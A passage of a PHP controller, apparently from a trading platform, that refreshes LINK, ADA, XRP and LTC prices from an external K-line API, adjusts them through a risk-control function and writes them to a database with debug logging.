        $setup_result .= "实时数据: http://127.0.0.1:8071/index.php/index/api/getprodata?pid=27\n";
        $setup_result .= "K线数据: http://127.0.0.1:8071/index.php/index/api/getkdata?pid=27&num=30&interval=5\n";
        
        $setup_result .= "\n🎉 USD/CNH 产品配置完成！";
        
        return $setup_result;
    }

    /**
     * 刷新新币种数据
     * 直接调用此方法更新价格
     */
    public function refresh_new_coins()
    {
        // 需要刷新的币种
        $coins = ['linkusd', 'adausd', 'xrpusd', 'ltcusd'];
        $nowtime = time() . rand(100, 999);
        
        foreach ($coins as $coin) {
            // 获取产品信息
            $pro = db('productinfo')->where('procode', $coin)->find();
            if (!$pro) continue;
            
            $symbol = $coin;
            $thisdata = [];
            
            // 映射表
            $currency_match_map = [
                'linkusd' => ['id' => 61, 'symbol' => 'LINK%2FUSDT'],
                'adausd'  => ['id' => 69, 'symbol' => 'ADA%2FUSDT'],
                'xrpusd'  => ['id' => 11, 'symbol' => 'XRP%2FUSDT'],
                'ltcusd'  => ['id' => 23, 'symbol' => 'LTC%2FUSDT']
            ];
            
            // 确保币种在映射表中
            if (!isset($currency_match_map[$symbol])) continue;
            
            $currency_match_id = $currency_match_map[$symbol]['id'];
            $symbol_name = $currency_match_map[$symbol]['symbol'];
            
            // API请求参数
            $to = time();
            $from = $to - (24 * 60 * 60); // 获取最近24小时数据
            
            // 构建URL并请求
            $url = 'https://api.lbuul.cn/api/market/kline?symbol='.$symbol_name.'&currency_match_id='.$currency_match_id.'&period=1day&from='.$from.'&to='.$to;
            $resp = $this->curlfun($url, array(), 'GET');
            
            // 添加调试日志
            file_put_contents('debug_api_'.$symbol.'.log', date('Y-m-d H:i:s')." URL: ".$url."\nResponse: ".$resp."\n\n", FILE_APPEND);
            
            // 解析返回结果
            $json = json_decode($resp, true);
            
            // 处理数据
            if (isset($json['data']) && is_array($json['data']) && !empty($json['data'])) {
                $data_arr = end($json['data']); // 取最后一条
                
                $thisdata['Price'] = $this->fengkong($data_arr['close'], $pro);
                $thisdata['Open'] = $data_arr['open'];
                $thisdata['Close'] = $data_arr['close'];
                $thisdata['High'] = $data_arr['high'];
                $thisdata['Low'] = $data_arr['low'];
                
                $thisdata['Diff'] = $thisdata['Price']-$thisdata['Open'];
                $thisdata['DiffRate'] = (string)round((($thisdata['Price']-$thisdata['Open'])/$thisdata['Open']*100),2).'%';
                $thisdata['Name'] = $pro['ptitle'];
                $thisdata['UpdateTime'] = $nowtime;
                
                // 关键：更新数据库
                Db::name('productdata')->where(['pid'=>$pro['pid']])->update($thisdata);
                
                echo "Updated {$pro['ptitle']} (PID: {$pro['pid']}, Price: {$thisdata['Price']})<br/>";
            } else {
                echo "Failed to update {$pro['ptitle']} (PID: {$pro['pid']})<br/>";
            }
        }
        
        return "Refresh completed at ".date('Y-m-d H:i:s');
    }
}


 ?>